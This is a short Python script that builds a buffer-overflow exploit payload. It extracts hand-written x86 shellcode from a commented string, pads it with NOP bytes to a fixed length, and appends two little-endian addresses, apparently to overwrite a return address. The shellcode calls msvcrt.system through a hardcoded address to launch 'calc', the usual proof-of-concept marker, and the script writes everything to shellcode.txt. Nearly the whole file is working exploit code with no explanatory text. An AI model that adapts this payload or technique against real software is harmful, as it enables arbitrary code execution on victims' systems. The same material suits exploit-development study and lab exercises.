import re

shellcode_bytes = b'\x90'

# Original shellcode (with comments)
raw_shellcode = '''"\\x89\\xE5"   // MOV EBP,ESP
"\\x31\\xFF"            // XOR EDI,EDI (EDI=0)
"\\x57"                // PUSH EDI
"\\x57"                // PUSH EDI
"\\xC6\\x45\\xF8\\x63"    // MOV BYTE PTR SS:[EBP-8],63 "c"
"\\xC6\\x45\\xF9\\x61"    // MOV BYTE PTR SS:[EBP-7],61 "a"
"\\xC6\\x45\\xFA\\x6C"    // MOV BYTE PTR SS:[EBP-6],6C "l"
"\\xC6\\x45\\xFB\\x63"    // MOV BYTE PTR SS:[EBP-5],63 "c"
"\\x8D\\x45\\xF8"        // LEA EAX,DWORD PTR SS:[EBP-8] "calc"
"\\x50"                // PUSH EAX
"\\xB8\\xC7\\x93\\xBF\\x77"// MOV EAX,msvcrt.system
"\\xFF\\xD0"            // CALL EAX
'''

# Extract all \x.. format bytes
bytes_hex = re.findall(r'\\x[0-9a-fA-F]{2}', raw_shellcode)
shellcode_bytes += bytes(int(b[2:], 16) for b in bytes_hex)

# Pad to 97 bytes (using NOP 0x90 as padding)
if len(shellcode_bytes) < 97:
    padding = bytes([0x90] * (97 - len(shellcode_bytes)))
    shellcode_bytes += padding

# Write to file
with open('shellcode.txt', 'wb') as f:
    f.write(shellcode_bytes)
    # Write the additional values in little-endian format
    f.write(bytes.fromhex('60FF4002'))  # 0240FF60
    f.write(bytes.fromhex('C0FE4002'))  # 0240FEC0

print(f"Shellcode written to 'shellcode.txt' ({len(shellcode_bytes) + 8} bytes).")
